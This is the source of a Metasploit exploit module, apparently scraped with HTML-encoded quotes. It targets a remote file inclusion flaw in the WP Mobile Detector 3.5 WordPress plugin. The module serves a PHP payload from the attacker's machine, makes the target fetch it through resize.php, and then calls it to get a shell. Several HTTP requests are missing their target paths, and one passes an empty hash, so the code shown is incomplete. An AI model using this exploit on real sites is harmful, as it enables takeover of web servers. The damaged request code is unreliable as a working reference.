# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(
      info,
      &#039;Name&#039;            => &#039;WordPress WP Mobile Detector 3.5 Shell Upload&#039;,
      &#039;Description&#039;     => %q{
          WP Mobile Detector Plugin for WordPress contains a flaw that allows a remote attacker
          to execute arbitrary PHP code. This flaw exists because the
          /wp-content/plugins/wp-mobile-detector/resize.php script does contains a
          remote file include for files not cached by the system already.
          By uploading a .php file, the remote system will
          place the file in a user-accessible path. Making a direct request to the
          uploaded file will allow the attacker to execute the script with the privileges
          of the web server.
        },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;pluginvulnerabilities.com&#039;, # Vulnerability disclosure
          &#039;Aaditya Purani&#039;, # EDB module discovered after writing module
          &#039;h00die&#039; # Metasploit module
        ],
      &#039;References&#039;      =>
        [
          [&#039;WPVDB&#039;, &#039;8505&#039;],
          [&#039;EDB&#039;, &#039;39891&#039;],
          [&#039;URL&#039;, &#039;https://www.pluginvulnerabilities.com/2016/05/31/aribitrary-file-upload-vulnerability-in-wp-mobile-detector/&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;May 31 2016&#039;,
      &#039;Platform&#039;        => &#039;php&#039;,
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         => [[&#039;wp-mobile-detectory < 3.6&#039;, {}]],
      &#039;DefaultTarget&#039;   => 0,
      &#039;Stance&#039;          => Msf::Exploit::Stance::Aggressive
    ))
  end

  def check
    check_plugin_version_from_readme(&#039;wp-mobile-detector&#039;, &#039;3.5&#039;)
  end

  def exploit
    payload_name = rand_text_alphanumeric(10) + &#039;.php&#039;

    # First check to see if the file is written already, if it is cache wont retrieve it from us
    res = send_request_cgi(
      &#039;global&#039; => true,
      &#039;method&#039;  => &#039;GET&#039;,
    )
    if res && !res.body.include?(payload_name)
      vprint_status("#{payload_name} verified as not written.")
    else
      fail_with(Failure::BadConfig,"#{payload_name} already written on system.")
    end

    def on_request_uri(cli, _request)
      print_good(&#039;Payload requested on server, sending&#039;)
      send_response(cli, payload.encoded)
    end

    print_status(&#039;Starting Payload Server&#039;)
    start_service(&#039;Path&#039; => "/#{payload_name}")


    res = send_request_cgi(
      &#039;global&#039; => true,
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;vars_get&#039; => {&#039;src&#039; => get_uri}
    )

    if res && res.code == 200
      print_good(&#039;Sleeping 5 seconds for payload upload&#039;)
      register_files_for_cleanup(payload_name)

      Rex.sleep(5)

      send_request_cgi(
      {
      })
      # wait for callback, without this we exit too fast and miss our shell
      Rex.sleep(2)
    else
      if res.nil?
        fail_with(Failure::Unreachable, &#039;No response from the target&#039;)
      else
        vprint_error("HTTP Status: #{res.code}")
        vprint_error("Server returned: #{res.body}")
        fail_with(Failure::UnexpectedReply, &#039;Failed to upload the payload&#039;)
      end
    end
  end
end

